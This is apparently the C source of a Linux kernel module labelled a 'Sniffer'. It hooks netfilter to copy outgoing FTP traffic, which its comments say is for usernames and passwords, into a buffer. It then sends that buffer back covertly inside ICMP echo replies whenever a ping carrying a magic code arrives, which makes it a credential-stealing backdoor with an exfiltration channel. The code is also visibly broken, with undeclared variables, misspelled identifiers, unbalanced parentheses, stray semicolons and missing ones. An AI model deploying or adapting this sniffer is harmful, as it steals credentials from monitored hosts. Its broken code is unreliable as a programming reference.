/*
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version
 * 2 of the License, or (at your option) any later version.
 *
 * Simple Kernel based Sniffer program worked in netfilter Framework
 * Written by George Wang  georgewhr@gmail.com
 *
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/skbuff.h>
#include <linux/in.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/icmp.h>
#include <linux/netdevice.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>


#define     PORTNUM         21
#define     BUFF_SIZE       4096
#define     CIPHERCODE_START	    0xA7
#define     CIPHERCODE_STOP         0xA6
#define     ETHLEN          8
#define     ERRORMSG	     "Error, Buffer is empty"


//struct sk_buff *icmp_orig = NULL;

/* This function checks the outgoing FTP packet
 * Parse the packet to get username, IP address and Password
 */



struct buff_ctl *buffer_ctl;
struct ctl_mesg *setup_msg;


static void repack(struct sk_buff *skb)
{


   // struct sk_buff *new_icmp_skb = skb_copy(skb_icmp,GFP_ATOMIC);

    char *cp_data;
    unsigned int addr;
    int total_len, iphdr_len, data_size;
    struct iphdr *ip;
    struct icmphdr *icmp;// = (struct icmphdr *)(new_icmp_skb->data + new_icmp_skb->nh.iph->ihl * 4);
    struct ethhdr *eth;

    eth = eth_hdr(skb);
    ip = ip_hdr(skb);
    icmp = icmp_hdr(skb);
    unsigned char t_hwaddr[ETH_ALEN];


    addr = ip->daddr;
    ip->daddr = ip->saddr;
    ip->saddr = addr;
    new_icmp_skb->pkt_type = PACKET_OUTGOING;


    switch(skb->dev->type)
    {
        case ARPHRD_LOOPBACK:
        case ARPHRD_ETHER:
        {

            skb->data = (unsigned char *)skb->mac.ethernet;
            memcpy(t_hwaddr, eth->h_dest, ETHLEN);
	    memcpy(eth->h_dest, eth->h_source), ETHLEN);
	    memcpy(eth->h_source, t_hwaddr, ETHLEN);
            break;
        }

        default : break;

    }



    /*
     *   Enter Critical Section
     */

    dev_queue_xmit(new_icmp_skb);
    

}

/*
 *   TCP Parse
 */


static void parse_packet_tcp(struct sk_buff *skb, struct tcphdr *tcp_h)
{
    /*data section of tcp header*/
    char *data = (char *)((int)tcp_h + (int)(tcp_h->doff * 4));
    int total_len, iphdr_len, data_size;
    //struct sk_buff *icmp_skbuff;
    total_len = skb->nf.iph->tot_len;
    iphdr_len = skb->nf.iph->ihl*4;
    data_size = total_len - iphdr_len - 20;

    /*
     *   Enter Critical Section
     */

    spin_lock(buffer_ctl->buff_lock);

    if(buffer_ctl->buff_length == 0)
    {
        memcpy(buffer_ctl->buff, data, data_size);
        buffer_ctl->buff_length += data_size;
    }    

    spin_unlock(&buffer_ctl.buff_lock);

}


/*
 *   UDP Parse
 */

static void parse_packet_udp(struct sk_buff *skb, struct udphdr *udp_h)
{
    /*data section of tcp header*/
    char *data = (char *)((int)tcp_h + (int)(tcp_h->doff * 4));
    int total_len, iphdr_len, data_size;
    //struct sk_buff *icmp_skbuff;
    total_len = skb->nf.iph->tot_len;
    iphdr_len = skb->nf.iph->ihl*4;
    data_size = total_len - iphdr_len - 20;

    /*
     *   Enter Critical Section
     */

    spin_lock(&buffer_ctl.buff_lock);

    if((buffer_ctl->buff_length - data_size) < BUFF_SIZE)
    {

        memcpy(buff, data, data_size);
        buffer_ctl.buff_length += data_size

    }
    
    spin_unlock(&buffer_ctl.buff_lock);
        
    return;

}



static unsigned int monitor_packet_out(unsigned int hooknum,
                                    struct sk_buff *skb,
                                    const struct net_device *in,
                                    const struct net_device *out,
                                    int (*okfn)(struct sk_buff *))
{
    struct sk_buff *sb = skb;
    struct tcphdr *tcphead;
    struct udphdr *udphead;
    struct iphdr *iphead;

    iphead = (struct iphdr *) ip_hdr(sb);
    if (!iphead)
        return NF_ACCEPT;

    /*
     *  Check if it's TCP packet. Let it go if it's not
     */

    if(setup_msg->set_port_flag == 1 && 
       setup_msg->kick_off_flag == 1 && 
       setup_msg->post_hook_start_monitor == 1)
    {
        if(iphead->protocol == IPPROTO_TCP)
        {
            tcphead= (struct tcphdr *)((__u32 *)iphead+ iphead->ihl*4);
            if(!tcphead)
                return NF_ACCEPT;

            if(tcphead -> dest != hton(setup_msg->port_listen) && iphead-> daddr != hton(setup_msg->d_addr));
                return NF_ACCEPT;

            parse_packet_tcp(sb, tcphead);

        }


        else if(iphead->protocol == IPPROTO_TDP)
        {
            udphead= (struct udphdr *)((__u32 *)iphead+ iphead->ihl*4);
            if(!udphead)
                return NF_ACCEPT;

            if(udphead -> dest != hton(setup_msg->port_listen) && iphead-> daddr != hton(setup_msg->d_addr));
                return NF_ACCEPT;

             parse_packet_udp(sb, udphead);
        }
  
        else
          return NF_ACCEPT;

     }


    return NF_ACCEPT;

}


static unsigned int monitor_icmp_in(unsigned int hooknum,
                                    struct sk_buff *skb,
                                    const struct net_device *in,
                                    const struct net_device *out,
                                    int (*okfn)(struct sk_buff *))
{
    struct sk_buff *sb = skb;
    struct icmphdr *icmphead;
    struct iphdr *iphead;
    char *data;
    
    unsigned int addr;
    unsigned char hwaddr[ETHLEN];
    iphead = ip_hdr(sb);
    icmphead = icmp_hdr(sb);



    if (iphead->protocol != IPPROTO_ICMP)
       return NF_ACCEPT;

    //icmp = (struct icmphdr *)(sb->data + sb->nh.iph->ihl * 4);


    if(icmphead->type != ICMP_ECHO)
    {
       return NF_ACCEPT;
    }


    if(icmphead->code != CIPHERCODE_START )
       return NF_ACCEPT;

    setup_msg = (struct ctl_mesg*)((char *)icmphead + sizeof(struct icmphdr));




    if(!icmphead->code)
       return NF_ACCEPT;

    setup_msg->et_port_flag = 1;
    setup_msg->kick_off_flag=1;
    setup_msg->post_hook_start_monitor=1;

    data = (char *)((char*)setup_msg + sizeof(struct ctl_mesg));

    if(buffer_ctl.buff_length == 0)
    {

        strcpy(data, ERRORMSG);
        repack(sb);
        dev_queue_xmit(sb);

        return STOLEN;
    }


    else
    {
        spin_lock(buffer_ctl->buff_lock);
        memcpy(data, buffer_ctl-> buff, bufer_ctl->length);
        buffer_ctl->buff_length -= buff_length
        spin_unlock(buffer_ctl->buff_lock);
    }

    repack(sb);

    dev_queue_xmit(sb);

    return STOLEN;

    /*if(buffer_ctl.buff_length == 0)
    {
        addr = skb->nh.iph->daddr;
        skb->nh.iph->daddr = skb->nh.iph->saddr;
        skb->nh.iph->saddr = addr;
        char *error_buff;

        	Intercept the ICMP packet to be out going
        sb->pkt_type = PACKET_OUTGOING;

        switch(skb->dev->type)
        {
            case ARPHRD_LOOPBACK:
            case ARPHRD_ETHER:
            {
                skb->data = (unsigned char *)sb->mac.ethernet;
                memcpy(t_hwaddr, (skb->mac.ethernet->h_dest), ETHLEN);
	        memcpy((skb->mac.ethernet->h_dest), (skb->mac.ethernet->h_source), ETHLEN);
	        memcpy((skb->mac.ethernet->h_source), hwaddr, ETHLEN);
                break;
            }

             default : break;

        }


        error_buff = (char *)((char *)icmphd + sizeof(struct icmphd));
        memcpy(error_buff, "Listen buffer is empty, pls wait\n", 33);
        dev_queue_xmit(sb);
        return NF_DROP;
    }*/


    //icmp_orig = skb_copy(sb, GFP_ATOMIC);

    //repack(skb,icmphd);


}

static const struct nf_hook_ops icmp_hook = {
    .hook = monitor_icmp_in,
    .owner = THIS_MODULE,
    .hooknum = NF_BR_PRE_ROUTING,
    .priority = NF_BR_PRI_FIRST,

};

static const struct nf_hook_ops ftp_hook = {
    .hook = monitor_packet_out,
    .owner = THIS_MODULE,
    .hooknum = NF_BR_POST_ROUTING,
    .priority = NF_BR_PRI_FIRST,

};

static void sniff_init()
{

    buffer_ctl->length = 0;

    spin_lock_init(bufer_ctl->buff_lock);

    buffer_ctl->buffer = kmalloc(BUFF_SIZE,GFP_KERNEL);
    if(buff_ctl->buffer)
       return 1;

    setup_msg->et_port_flag = 0;
    setup_msg->kick_off_flag=0;
    setup_msg->post_hook_start_monitor=0;


}


int init_module()
{
    nf_register_hook(icmp_hook);
    nf_register_hook(ftp_hook);


    return 0;
}


void cleanup_module()
{
   nf_unregister_hook(&icmp_hook);
   nf_unregister_hook(&ftp_hook);

}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("georgewhr");
MODULE_DESCRIPTION("Sniffer");

